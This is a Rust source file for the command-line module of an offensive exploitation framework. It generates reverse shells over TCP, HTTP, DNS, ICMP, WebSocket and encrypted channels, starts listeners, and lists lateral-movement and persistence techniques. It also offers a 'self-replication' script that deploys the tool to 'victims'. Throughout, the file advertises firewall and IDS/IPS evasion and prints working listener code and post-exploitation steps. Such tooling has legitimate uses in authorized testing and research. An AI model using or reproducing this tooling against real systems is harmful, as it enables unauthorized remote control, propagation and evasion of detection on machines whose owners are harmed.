/// Exploitation Framework CLI Commands
///
/// ‚ö†Ô∏è AUTHORIZED USE ONLY ‚ö†Ô∏è
///
/// **Works alongside**: Metasploit, LinPEAS, WinPEAS, GTFOBins, CrackMapExec, BloodHound
use crate::cli::commands::{Command, Flag, Route};
use crate::cli::output::Output;
use crate::cli::CliContext;
use crate::modules::exploit::{
    lateral_movement::{LateralMovementScanner, PersistenceMechanism},
    listener::ExploitListener,
    payloads::{MultiHandlerConfig, PayloadConfig, PayloadGenerator, ShellType},
    privesc::PrivEscScanner,
};

pub struct ExploitCommand;

impl Command for ExploitCommand {
    fn domain(&self) -> &str {
        "exploit"
    }

    fn resource(&self) -> &str {
        "payload"
    }

    fn description(&self) -> &str {
        "Exploitation framework - privilege escalation, payloads, lateral movement"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "privesc",
                summary: "Scan for privilege escalation vectors",
                usage: "rb exploit payload privesc",
            },
            Route {
                verb: "shell",
                summary: "Generate TCP reverse shell payload",
                usage: "rb exploit payload shell --type <shell> --host <ip:port>",
            },
            Route {
                verb: "http-shell",
                summary: "Generate HTTP reverse shell payload (firewall bypass)",
                usage: "rb exploit payload http-shell --type <shell> --host <ip:port>",
            },
            Route {
                verb: "dns-shell",
                summary: "Generate DNS tunneling reverse shell (99% firewall bypass!)",
                usage: "rb exploit payload dns-shell --type <shell> --domain <domain>",
            },
            Route {
                verb: "multi-shell",
                summary: "Generate multi-handler shell (tries TCP ‚Üí HTTP ‚Üí DNS with fallback)",
                usage: "rb exploit payload multi-shell --type <shell> --host <ip:port> [--domain <domain>]",
            },
            Route {
                verb: "encrypted-shell",
                summary: "Generate encrypted reverse shell with ChaCha20 (IDS/IPS evasion!)",
                usage: "rb exploit payload encrypted-shell --type <shell> --host <ip:port> [--key <key>]",
            },
            Route {
                verb: "icmp-shell",
                summary: "Generate ICMP reverse shell (tunneling over ping - 95% bypass!)",
                usage: "rb exploit payload icmp-shell --type <shell> --host <ip>",
            },
            Route {
                verb: "websocket-shell",
                summary: "Generate WebSocket reverse shell (99% bypass - HTTP/HTTPS ports!)",
                usage: "rb exploit payload websocket-shell --type <shell> --host <ip:port>",
            },
            Route {
                verb: "listener",
                summary: "Show listener commands (external tools)",
                usage: "rb exploit payload listener --port <port>",
            },
            Route {
                verb: "start",
                summary: "Start listener (TCP or HTTP)",
                usage: "rb exploit payload start --port <port> [--listener-type tcp|http]",
            },
            Route {
                verb: "sessions",
                summary: "List active reverse shell sessions",
                usage: "rb exploit payload sessions",
            },
            Route {
                verb: "lateral",
                summary: "Show lateral movement techniques",
                usage: "rb exploit payload lateral [technique]",
            },
            Route {
                verb: "persist",
                summary: "Show persistence mechanisms",
                usage: "rb exploit payload persist [mechanism]",
            },
            Route {
                verb: "replicate",
                summary: "Generate self-replication deployment script (deploy rb binary to victims)",
                usage: "rb exploit payload replicate [--os linux|windows|macos] [--persist] [-o script.sh]",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new(
                "type",
                "Shell type (bash|python|php|powershell|nc|socat|...)",
            )
            .with_short('t')
            .with_default("bash"),
            Flag::new("host", "Listener address (IP:PORT, e.g., 10.0.0.1:4444)")
                .with_short('H')
                .with_arg("IP:PORT"),
            Flag::new("port", "Port for listener").with_default("4444"),
            Flag::new("listener-type", "Listener type (tcp|http|dns|websocket)")
                .with_default("tcp"),
            Flag::new(
                "domain",
                "Domain for DNS tunneling (e.g., tunnel.attacker.com)",
            )
            .with_short('d')
            .with_arg("DOMAIN"),
            Flag::new("tcp-port", "TCP port for multi-handler (default: 4444)")
                .with_default("4444"),
            Flag::new("http-port", "HTTP port for multi-handler (default: 8080)")
                .with_default("8080"),
            Flag::new(
                "key",
                "ChaCha20 encryption key (32 bytes, base64). Auto-generated if not provided",
            )
            .with_short('k')
            .with_arg("KEY"),
            Flag::new(
                "nonce",
                "ChaCha20 nonce (12 bytes, base64). Auto-generated if not provided",
            )
            .with_short('n')
            .with_arg("NONCE"),
            Flag::new("ssl", "Use SSL/TLS for encrypted shell (socat only)"),
            Flag::new("os", "Target OS for self-replication (linux|windows|macos)")
                .with_short('o')
                .with_default("linux")
                .with_arg("OS"),
            Flag::new(
                "persist",
                "Enable persistence mechanisms in deployment script",
            ),
            Flag::new("output", "Output file for deployment script")
                .with_short('O')
                .with_arg("FILE"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Scan for privilege escalation vectors",
                "rb exploit payload privesc",
            ),
            (
                "Generate Python reverse shell",
                "rb exploit payload shell --type python --host 10.10.10.10:4444",
            ),
            (
                "Generate PowerShell reverse shell",
                "rb exploit payload shell --type powershell --host 192.168.1.100:443",
            ),
            (
                "Generate listener command",
                "rb exploit payload listener --port 4444",
            ),
            (
                "Show SSH tunneling techniques",
                "rb exploit payload lateral ssh_tunneling",
            ),
            (
                "Show Linux persistence techniques",
                "rb exploit payload persist cron_persistence",
            ),
            (
                "Generate self-replication script for Linux",
                "rb exploit payload replicate --os linux --output deploy.sh",
            ),
            (
                "Generate self-replication script for Windows with persistence",
                "rb exploit payload replicate --os windows --persist --output deploy.ps1",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_ref().ok_or_else(|| {
            "Missing verb. Use: rb exploit payload <verb>\nTry: rb exploit payload help".to_string()
        })?;

        match verb.as_str() {
            "privesc" => self.privesc_scan(ctx),
            "shell" => self.generate_shell(ctx),
            "http-shell" => self.generate_http_shell(ctx),
            "dns-shell" => self.generate_dns_shell(ctx),
            "multi-shell" => self.generate_multi_shell(ctx),
            "encrypted-shell" => self.generate_encrypted_shell(ctx),
            "icmp-shell" => self.generate_icmp_shell(ctx),
            "websocket-shell" => self.generate_websocket_shell(ctx),
            "listener" => self.generate_listener(ctx),
            "start" => self.start_listener(ctx),
            "sessions" => self.list_sessions(ctx),
            "lateral" => self.show_lateral_movement(ctx),
            "persist" => self.show_persistence(ctx),
            "replicate" => self.generate_self_replicate(ctx),
            "help" => {
                crate::cli::commands::print_help(self);
                Ok(())
            }
            _ => Err(format!(
                "Unknown verb '{}'. Use: rb exploit payload help",
                verb
            )),
        }
    }
}

impl ExploitCommand {
    /// Parse host and port from --host IP:PORT format
    fn parse_host_port(
        &self,
        ctx: &CliContext,
        default_port: &str,
    ) -> Result<(String, u16), String> {
        let host = ctx
            .get_flag("host")
            .ok_or("Missing --host flag. Use: --host IP:PORT (e.g., --host 10.0.0.1:4444)")?;

        if let Some((ip, port_str)) = host.split_once(':') {
            let port: u16 = port_str
                .parse()
                .map_err(|_| format!("Invalid port in --host: {}", port_str))?;
            Ok((ip.to_string(), port))
        } else {
            // If no port specified, use default
            let port: u16 = default_port
                .parse()
                .map_err(|_| format!("Invalid default port: {}", default_port))?;
            Ok((host.clone(), port))
        }
    }

    fn privesc_scan(&self, _ctx: &CliContext) -> Result<(), String> {
        Output::header("Privilege Escalation Scanner");

        Output::spinner_start("Scanning for privilege escalation vectors");

        let scanner = PrivEscScanner::new();
        let scan_result = scanner.scan()?;
        let vectors = &scan_result.vectors;

        Output::spinner_done();

        if vectors.is_empty() {
            Output::success("No obvious privilege escalation vectors found.");
            println!("\n  This is a good sign! But always check manually:");
            println!("  ‚Ä¢ LinPEAS: https://github.com/carlospolop/PEASS-ng");
            println!("  ‚Ä¢ WinPEAS: https://github.com/carlospolop/PEASS-ng");
            println!("  ‚Ä¢ GTFOBins: https://gtfobins.github.io/");
            return Ok(());
        }

        Output::success(&format!("Found {} potential vectors", vectors.len()));
        println!();

        // Group by severity
        let critical: Vec<_> = vectors
            .iter()
            .filter(|v| {
                matches!(
                    v.severity,
                    crate::modules::exploit::privesc::Severity::Critical
                )
            })
            .collect();
        let high: Vec<_> = vectors
            .iter()
            .filter(|v| matches!(v.severity, crate::modules::exploit::privesc::Severity::High))
            .collect();
        let medium: Vec<_> = vectors
            .iter()
            .filter(|v| {
                matches!(
                    v.severity,
                    crate::modules::exploit::privesc::Severity::Medium
                )
            })
            .collect();

        if !critical.is_empty() {
            println!(
                "\x1b[1m\x1b[31müî¥ CRITICAL ({} vectors)\x1b[0m",
                critical.len()
            );
            for v in critical {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!("    \x1b[36müí° {}\x1b[0m", v.exploit_technique);
                if !v.references.is_empty() {
                    println!("    üìñ {}", v.references.join(", "));
                }
                println!();
            }
        }

        if !high.is_empty() {
            println!("\x1b[1m\x1b[33müü† HIGH ({} vectors)\x1b[0m", high.len());
            for v in high {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!("    \x1b[36müí° {}\x1b[0m", v.exploit_technique);
                println!();
            }
        }

        if !medium.is_empty() {
            println!("\x1b[1m\x1b[34müîµ MEDIUM ({} vectors)\x1b[0m", medium.len());
            for v in medium {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!();
            }
        }

        println!("\n\x1b[1mNext Steps:\x1b[0m");
        println!("  1. Verify findings manually");
        println!("  2. Check GTFOBins for SUID exploitation");
        println!("  3. Search for kernel exploits: searchsploit <version>");
        println!("  4. Generate payload: rb exploit payload shell --type python --lhost <ip>");

        Ok(())
    }

    fn generate_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "bash");
        let (lhost, lport_num) = self.parse_host_port(ctx, "4444")?;

        Output::header(&format!("Reverse Shell Generator - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "perl" | "pl" => ShellType::Perl,
            "php" => ShellType::PHP,
            "ruby" | "rb" => ShellType::Ruby,
            "nc" | "netcat" => ShellType::Netcat,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            "socat" => ShellType::Socat,
            "awk" => ShellType::Awk,
            "java" => ShellType::Java,
            "node" | "nodejs" | "js" => ShellType::Node,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available: bash, python, perl, php, ruby, nc, powershell, socat, awk, java, node",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listener:\x1b[0m");
        println!("  nc -lvnp {}", lport_num);
        println!("  OR");
        println!("  rb exploit payload listener --port {}", lport_num);

        println!("\n\x1b[1müîß Shell Stabilization (after connection):\x1b[0m");
        println!("  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'");
        println!("  Ctrl+Z (background)");
        println!("  stty raw -echo; fg");
        println!("  export TERM=xterm");

        Ok(())
    }

    fn generate_http_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, lport_num) = self.parse_host_port(ctx, "8080")?;

        Output::header(&format!("HTTP Reverse Shell Generator - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "php" => ShellType::PHP,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for HTTP: bash, python, php, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_http_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "HTTP (Firewall Bypass)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start HTTP Listener:\x1b[0m");
        println!(
            "  rb exploit payload start --port {} --listener-type http",
            lport_num
        );

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 80% of firewalls (HTTP usually allowed)");
        println!("  ‚Ä¢ Works through HTTP proxies");
        println!("  ‚Ä¢ Stealth (looks like normal web traffic)");
        println!("  ‚Ä¢ No direct TCP connection needed");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Target polls HTTP listener for commands (GET /cmd/<id>)");
        println!("  2. Listener sends command as HTTP response");
        println!("  3. Target executes and sends output back (POST /output/<id>)");
        println!("  4. Process repeats every 5 seconds");

        Ok(())
    }

    fn generate_dns_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let domain = ctx
            .get_flag("domain")
            .ok_or("Missing --domain flag (e.g., tunnel.attacker.com)")?;

        Output::header(&format!(
            "DNS Tunneling Reverse Shell Generator - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: domain.clone(), // Use lhost field for domain
            lport: 53,             // DNS port
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "php" => ShellType::PHP,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for DNS: bash, python, php, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_dns_reverse_shell(shell_type_enum, &config);

        Output::item("Domain", domain);
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "DNS Tunneling (99% Firewall Bypass!)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start DNS Listener:\x1b[0m");
        println!("  sudo rb exploit payload start --port 53 --listener-type dns");

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 99% of firewalls (DNS NEVER blocked!)");
        println!("  ‚Ä¢ Works through HTTP proxies");
        println!("  ‚Ä¢ Maximum stealth (looks like DNS traffic)");
        println!("  ‚Ä¢ No persistent connection needed");
        println!("  ‚Ä¢ Works behind NAT/firewalls");

        println!("\n\x1b[1m‚ö†Ô∏è  Requirements:\x1b[0m");
        println!("  ‚Ä¢ You must own the domain: {}", domain);
        println!("  ‚Ä¢ Configure NS record to point to your server");
        println!("  ‚Ä¢ Run DNS listener on port 53 (requires root/sudo)");

        println!("\n\x1b[1müîß DNS Setup:\x1b[0m");
        println!("  1. Create NS record: tunnel.{} ‚Üí your-server-ip", domain);
        println!("  2. sudo rb exploit payload start --port 53 --listener-type dns");
        println!("  3. Execute payload on target");

        println!("\n\x1b[1müöÄ How it works:\x1b[0m");
        println!("  1. Target sends: register.<session_id>.{}", domain);
        println!(
            "  2. Target polls: cmd.<session_id>.{} (gets command in TXT)",
            domain
        );
        println!("  3. Target executes command");
        println!(
            "  4. Target sends: <output>.<session_id>.{} (chunked)",
            domain
        );

        Ok(())
    }

    fn generate_multi_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, _) = self.parse_host_port(ctx, "4444")?;
        let tcp_port = ctx.get_flag_or("tcp-port", "4444");
        let http_port = ctx.get_flag_or("http-port", "8080");
        let domain = ctx.get_flag("domain");

        let tcp_port_num: u16 = tcp_port
            .parse()
            .map_err(|_| format!("Invalid TCP port: {}", tcp_port))?;
        let http_port_num: u16 = http_port
            .parse()
            .map_err(|_| format!("Invalid HTTP port: {}", http_port))?;

        Output::header(&format!(
            "Multi-Handler Reverse Shell Generator - {}",
            shell_type
        ));

        let config = MultiHandlerConfig {
            lhost: lhost.clone(),
            tcp_port: tcp_port_num,
            http_port: http_port_num,
            dns_domain: domain.cloned(),
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for multi-handler: bash, python, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_multi_handler(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("TCP Port", &tcp_port);
        Output::item("HTTP Port", &http_port);
        if let Some(ref d) = domain {
            Output::item("DNS Domain", d);
        }
        Output::item("Shell Type", &shell_type);
        Output::item("Strategy", "TCP ‚Üí HTTP ‚Üí DNS (automatic fallback)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listeners:\x1b[0m");
        println!("  # Terminal 1 - TCP listener");
        println!(
            "  rb exploit payload start --port {} --listener-type tcp",
            tcp_port
        );
        println!("\n  # Terminal 2 - HTTP listener");
        println!(
            "  rb exploit payload start --port {} --listener-type http",
            http_port
        );
        if domain.is_some() {
            println!("\n  # Terminal 3 - DNS listener (optional)");
            println!("  sudo rb exploit payload start --port 53 --listener-type dns");
        }

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Maximum reliability - tries multiple protocols");
        println!("  ‚Ä¢ Automatic fallback if one protocol fails");
        println!("  ‚Ä¢ TCP: Fastest (if not blocked)");
        println!("  ‚Ä¢ HTTP: 80% firewall bypass");
        println!("  ‚Ä¢ DNS: 99% firewall bypass (if domain configured)");
        println!("  ‚Ä¢ No persistent connection needed");

        println!("\n\x1b[1müöÄ How it works:\x1b[0m");
        println!("  1. Payload tries TCP first (port {}) - fastest", tcp_port);
        println!(
            "  2. If TCP fails ‚Üí tries HTTP (port {}) - firewall bypass",
            http_port
        );
        if domain.is_some() {
            println!("  3. If HTTP fails ‚Üí tries DNS tunneling - maximum bypass");
        } else {
            println!("  3. DNS disabled (no --domain provided)");
        }
        println!("  4. If all fail ‚Üí retry after 30 seconds");
        println!("  5. Ensures maximum success rate!");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Start all listeners before executing payload");
        println!("  ‚Ä¢ Payload will connect to whichever protocol succeeds first");
        println!("  ‚Ä¢ Add --domain for DNS fallback (requires domain ownership)");

        Ok(())
    }

    fn generate_encrypted_shell(&self, ctx: &CliContext) -> Result<(), String> {
        use crate::crypto::chacha20::{encode_base64, generate_key, generate_nonce};

        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, lport_num) = self.parse_host_port(ctx, "4444")?;

        // Generate or use provided key/nonce
        let key_b64 = if let Some(k) = ctx.get_flag("key") {
            k.clone()
        } else {
            let key = generate_key();
            encode_base64(&key)
        };

        let nonce_b64 = if let Some(n) = ctx.get_flag("nonce") {
            n.clone()
        } else {
            let nonce = generate_nonce();
            encode_base64(&nonce)
        };

        Output::header(&format!(
            "Encrypted Reverse Shell Generator (ChaCha20) - {}",
            shell_type
        ));

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for encrypted shells: bash, python",
                    shell_type
                ))
            }
        };

        let payload =
            PayloadGenerator::generate_encrypted_shell(shell_type_enum, &key_b64, &nonce_b64);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);
        Output::item("Encryption", "ChaCha20-256 (RFC 7539)");
        Output::item("Key (base64)", &key_b64);
        Output::item("Nonce (base64)", &nonce_b64);

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listener:\x1b[0m");
        println!("  nc -lvnp {}", lport_num);
        println!("  OR");
        println!("  rb exploit payload listener --port {}", lport_num);

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ End-to-end encryption with ChaCha20 (256-bit key)");
        println!("  ‚Ä¢ Bypasses IDS/IPS signature detection (encrypted payload)");
        println!("  ‚Ä¢ No cleartext commands over network");
        println!("  ‚Ä¢ No cleartext output over network");
        println!("  ‚Ä¢ RFC 7539 - Battle-tested cipher (used in TLS, VPNs)");
        println!("  ‚Ä¢ Simpler than AES, equally secure");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Payload connects to listener (encrypted TCP)");
        println!("  2. All commands are encrypted with ChaCha20 before transmission");
        println!("  3. All output is encrypted with ChaCha20 before transmission");
        println!("  4. Listener decrypts with same key/nonce");
        println!("  5. IDS/IPS sees only encrypted traffic!");

        println!("\n\x1b[1müîê Security Notes:\x1b[0m");
        println!("  ‚Ä¢ Keep key/nonce SECRET - anyone with them can decrypt traffic");
        println!("  ‚Ä¢ ChaCha20 is a stream cipher (symmetric encryption)");
        println!("  ‚Ä¢ Same key/nonce on both sides (payload and listener)");
        println!("  ‚Ä¢ Generate new key/nonce for each operation");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Save key/nonce to decrypt traffic later");
        println!("  ‚Ä¢ Use --key and --nonce flags to specify custom values");
        println!("  ‚Ä¢ Auto-generated if not provided");
        println!("  ‚Ä¢ For listener: implement ChaCha20 decryption on your side");

        println!("\n\x1b[1m‚ö†Ô∏è  Implementation Note:\x1b[0m");
        println!("  ‚Ä¢ Native encrypted listener coming soon!");
        println!("  ‚Ä¢ For now, you need to implement ChaCha20 decryption in your listener");
        println!("  ‚Ä¢ Python example: use pycryptodome or implement ChaCha20 from RFC 7539");
        println!("  ‚Ä¢ See payload source for embedded ChaCha20 implementation");

        Ok(())
    }

    fn generate_icmp_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, _) = self.parse_host_port(ctx, "0")?; // ICMP doesn't use ports, but parser needs default

        Output::header(&format!(
            "ICMP Reverse Shell Generator (Ping Tunneling) - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: 0, // ICMP doesn't use ports
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for ICMP: bash, python, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_icmp_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "ICMP (Ping Tunneling)");
        Output::item("Firewall Bypass", "95% (ICMP rarely blocked)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start ICMP Listener:\x1b[0m");
        println!("  ‚ö†Ô∏è  ICMP listener not yet implemented in redblue");
        println!("  Use external tool for now:");
        println!("  ‚Ä¢ icmpsh (https://github.com/bdamele/icmpsh)");
        println!("  ‚Ä¢ prism (https://github.com/andreafabrizi/prism)");
        println!("  ‚Ä¢ ptunnel (http://www.cs.uit.no/~daniels/PingTunnel/)");

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 95% of firewalls (ICMP/ping rarely blocked)");
        println!("  ‚Ä¢ Works through most corporate firewalls");
        println!("  ‚Ä¢ No TCP/UDP ports needed");
        println!("  ‚Ä¢ Stealthy (looks like normal ping traffic)");
        println!("  ‚Ä¢ Works behind NAT/firewalls");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Payload sends ICMP echo request with command request");
        println!("  2. Listener responds with ICMP echo reply containing command");
        println!("  3. Payload executes command");
        println!("  4. Payload sends output in ICMP echo request (chunked)");
        println!("  5. Process repeats - bidirectional communication over ping!");

        println!("\n\x1b[1m‚ö†Ô∏è  Requirements:\x1b[0m");
        println!("  ‚Ä¢ Payload requires root/sudo (raw ICMP sockets)");
        println!("  ‚Ä¢ Listener requires root/sudo (raw ICMP sockets)");
        println!("  ‚Ä¢ Both sides need ICMP access");
        println!("  ‚Ä¢ Target must be able to ping attacker IP");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Test with: ping {} (from target)", &lhost);
        println!("  ‚Ä¢ ICMP has ~1400 byte payload limit");
        println!("  ‚Ä¢ Output is chunked automatically");
        println!("  ‚Ä¢ Session ID tracks multiple connections");

        println!("\n\x1b[1müîß Manual Listener (Python):\x1b[0m");
        println!(
            r#"  sudo python3 -c "
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.bind(('0.0.0.0', 0))
while True:
    data, addr = sock.recvfrom(1024)
    print(f'ICMP from {{addr}}: {{data[28:]}}')  # Skip IP+ICMP headers
"
"#
        );

        Ok(())
    }

    fn generate_websocket_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, lport_num) = self.parse_host_port(ctx, "8080")?;

        Output::header(&format!(
            "WebSocket Reverse Shell Generator (RFC 6455) - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "python" | "py" => ShellType::Python,
            "node" | "nodejs" | "js" => ShellType::Node,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for WebSocket: python, node, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_websocket_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "WebSocket (RFC 6455)");
        Output::item("Firewall Bypass", "99% (HTTP/HTTPS ports)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start WebSocket Listener:\x1b[0m");
        println!("  ‚úÖ Native WebSocket listener - NO external tools needed!");
        println!(
            "  rb exploit payload start --port {} --listener-type websocket",
            lport_num
        );
        println!("\n  OR use external tools:");
        println!("  ‚Ä¢ wscat (npm install -g wscat)");
        println!("  ‚Ä¢ websocat (https://github.com/vi/websocat)");

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 99% of firewalls (uses HTTP/HTTPS ports 80/443)");
        println!("  ‚Ä¢ Works through HTTP proxies");
        println!("  ‚Ä¢ Persistent bidirectional connection");
        println!("  ‚Ä¢ No polling needed (real-time)");
        println!("  ‚Ä¢ Looks like legitimate web application traffic");
        println!("  ‚Ä¢ Supports binary data transfer");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Payload performs WebSocket handshake (HTTP Upgrade)");
        println!("  2. Connection upgraded to WebSocket protocol");
        println!("  3. Commands sent as WebSocket text frames");
        println!("  4. Output returned as WebSocket text frames");
        println!("  5. Persistent connection - no reconnection overhead!");

        println!("\n\x1b[1m‚ö†Ô∏è  Requirements:\x1b[0m");
        println!("  ‚Ä¢ Port {} must be accessible from target", lport_num);
        println!("  ‚Ä¢ Firewall allows HTTP/HTTPS traffic");
        println!("  ‚Ä¢ WebSocket listener on attacker machine");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Use port 80 or 443 for maximum bypass");
        println!("  ‚Ä¢ Add TLS for encrypted WebSocket (wss://)");
        println!("  ‚Ä¢ WebSocket frames support up to 2^63 bytes");
        println!("  ‚Ä¢ No chunking needed - protocol handles it");

        println!("\n\x1b[1müîß Simple WebSocket Listener (Python):\x1b[0m");
        println!(
            r#"  sudo python3 -c "
import socket, hashlib, base64

def ws_handshake(client):
    req = client.recv(1024).decode()
    key = [l for l in req.split('\r\n') if 'Sec-WebSocket-Key' in l][0].split(':')[1].strip()
    magic = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
    accept = base64.b64encode(hashlib.sha1((key + magic).encode()).digest()).decode()
    response = f'HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: {{accept}}\r\n\r\n'
    client.send(response.encode())

s = socket.socket()
s.bind(('0.0.0.0', {}))
s.listen(1)
print('[*] WebSocket listener on port {}')
c, a = s.accept()
print(f'[+] Connection from {{a}}')
ws_handshake(c)
print('[+] WebSocket handshake complete')
while True:
    # Receive and decode WebSocket frames here
    data = c.recv(4096)
    if not data: break
    print(f'Received: {{data}}')
"
"#,
            lport_num, lport_num
        );

        println!("\n\x1b[1müöÄ Quick Start with wscat:\x1b[0m");
        println!("  npm install -g wscat");
        println!("  wscat -l {}", lport_num);
        println!("  # Execute payload on target");
